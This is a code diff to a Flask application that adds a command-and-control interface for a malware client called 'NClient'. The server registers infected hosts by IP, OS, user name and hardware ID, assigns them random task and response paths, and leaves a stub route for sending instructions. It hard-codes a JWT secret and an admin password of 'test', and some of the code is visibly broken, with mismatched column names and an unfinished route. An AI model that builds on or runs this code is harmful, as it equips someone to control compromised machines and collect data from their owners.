@@ -3,6 +3,9 @@ from flask_sqlalchemy import SQLAlchemy
 import flask_login
 import secrets
 import bcrypt
+import jwt
+import random
+from eventlet import wsgi, listen
 
 app = flask.Flask(__name__)
 app.secret_key = secrets.token_hex()
@@ -56,10 +59,15 @@ class Device(db.Model):
     __tablename__= "devices"
     
     id = db.Column(db.Integer, primary_key=True)
+    jwt = db.Column(db.String)
     ip = db.Column(db.String)
     user = db.Column(db.String)
     os = db.Column(db.String)
     hwid = db.Column(db.String)
+    notes = db.Column(db.String)
+    uniquePath = db.Column(db.String)
+    taskPath = db.Column(db.String)
+    reponsePath = db.Column(db.String)
     
     def get_id(self):
         return self.id
@@ -132,9 +140,15 @@ def addAccount(username:str, passw:str, isAdmin:bool = False) -> str:
     db.session.commit()
     return 'Account created successfully'
 
+#Startup checks
 with app.app_context():
-    print(addAccount('admin', 'test', True))
-    print(addAccount('user', 'userTest', False))
+    a = addAccount('admin', 'test', True)
+    a = None
+    #Delete all known links for devices, so new can be generated
+
+@app.errorhandler(404)
+def not_found(error):
+    return flask.render_template('404.html'), 404
 
 @app.route('/')
 def indexPage():
@@ -178,3 +192,50 @@ def logoutPage():
 @flask_login.login_required
 def overviewPage():
     return flask.render_template('overview.html', user = flask_login.current_user.username)
+
+#C2 interface
+def validateC2Client(request:flask.request) -> bool:
+    try:
+        if request.headers['User-Agent'].split()[0] != "NClient": return False
+        request.headers['NClient-Token']
+        #add check for payload, validate encryption etc
+        #Add check if NClient-Token (jwt) IP is same as request IP
+        return True
+    except KeyError:
+        return False
+
+def generateRandPath() -> str:
+    x = ""
+    for y in range(12):
+        x += random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+    return x
+
+@app.route('/contact')
+def contactC2Page():
+    if not validateC2Client(flask.request): return not_found("Invalid")
+    jwT = flask.request.headers['NClient-Token']
+    if not Device.query.get(jwT):
+        token = jwt.decode(jwT, "Noire", algorithms="HS256")
+        uP, tP, rP = generateRandPath(), generateRandPath(), generateRandPath()
+        newClient = Device(jwt=jwT, ip=token['ip'], os=token['os'], user=token['user'],
+                           hwid=token['hwid'], uniquePath=uP, taskPath=tP, responsePath=rP)
+        db.session.add(newClient)
+        db.session.commit()
+    else:
+        a = Device.query.get(jwT)
+        uP, tP, rP = a.uniquePath, a.taskPath, a.responsePath
+    resp = flask.make_response("")
+    resp.headers['NClient-Path'], resp.headers['NClient-TaskPath'], resp.headers['NClient-ResponsePath'] = uP, tP, rP
+    return resp
+    
+
+@app.route('/c/<c2ID>/<pName>')
+def instructReponsePages(c2ID:str, pName:str):
+    if not validateC2Client(flask.request): return not_found("Invalid")
+
+#Run forever
+def start_server(port:int):
+    server = wsgi.Server(listen(('0.0.0.0', port)), '127.0.0.1', app=app)
+    print(f"Web server running on http://127.0.0.1:{str(port)}/")
+    print(server.address)
+    server.serve_forever()
